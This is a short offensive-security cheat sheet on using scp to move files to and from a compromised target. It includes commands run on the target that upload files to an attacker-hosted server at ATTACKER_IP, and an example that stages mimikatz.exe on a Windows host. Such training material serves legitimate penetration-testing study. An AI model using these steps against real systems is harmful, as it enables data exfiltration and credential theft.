---
title: SSH File Transfer
description: Learn how to transfer files from and to a compromised target using SSH.
categories: [File Transfer]
tags: [File Transfer, SSH]
weight: 2
---

The main advantage of file transfer using SSH is that files are encrypted in transit over an SSH connection.

To transfer files via SSH, we use the `scp` utility. Modern OpenSSH `scp` uses SFTP over SSH by default, so the remote SSH server needs an SFTP subsystem. The `-O` option selects the legacy SCP protocol when required by an older server.

## SSH File Transfer (Connect to Target Server)
If we have SSH access on the target host, we can run the `scp` command on our attacker machine to transfer files.

### Download Operation
To download a file from the target to our machine, we specify the remote path (`user@host:<PATH>`) as the copy source, and a local path as the destination.
```bash
scp <USER>@<TARGET_IP>:<REMOTE_PATH> <LOCAL_PATH>
```
`scp` can also authenticate to the target SSH server using public-key authentication. We use `-i` to specify the path to the private key.
```bash
scp -i <PRIV_KEY_PATH> <USER>@<TARGET_IP>:<REMOTE_PATH> <LOCAL_PATH>
```
If the SSH server listens on a different port, we can use `-P` to specify the port manually.
```bash
scp -P <PORT> <USER>@<TARGET_IP>:<REMOTE_PATH> <LOCAL_PATH>
```

### Upload Operation
To upload a file from the attacker machine to the target, we specify the local file path as the copy source and the remote path as the destination.
```bash
scp <LOCAL_PATH> <USER>@<TARGET_IP>:<REMOTE_PATH>
```

## SSH File Transfer (Connect to Attacker Server)
If we cannot log in via SSH on the target, or if SSH is not running there, we can run `scp` from the target and connect to an SSH server we host on the attacker machine. This requires an `scp` client on the target, outbound SSH connectivity, and valid credentials for the attacker-hosted server.

With an OpenSSH server installed, start the SSH service on a systemd-based attacker machine:
```bash
sudo systemctl start ssh
```
> Note: The name of the SSH server service may differ across distros. Some may call it `ssh`, `sshd`, or `openssh`. Check your distro documentation for details.

### Download Operation
Since the server now runs on the attacker machine, the file will be downloaded from the attacker machine to the target. Run the following command on the target:
```bash
scp <USER>@<ATTACKER_IP>:<REMOTE_PATH> <LOCAL_PATH>
```

### Upload Operation
Since the server now runs on the attacker machine, the file will be uploaded from the target to the attacker machine. Run the following command on the target:
```bash
scp <LOCAL_PATH> <USER>@<ATTACKER_IP>:<REMOTE_PATH>
```

## Using SCP with Windows
If an OpenSSH server with SFTP enabled is running on a Windows host, we can still use `scp` to transfer files. From a Unix-like shell, use forward slashes (`/`) in the Windows remote path and ensure the account can write to the destination directory.
```bash
scp mimikatz.exe Administrator@10.10.0.3:C:/Temp/
```
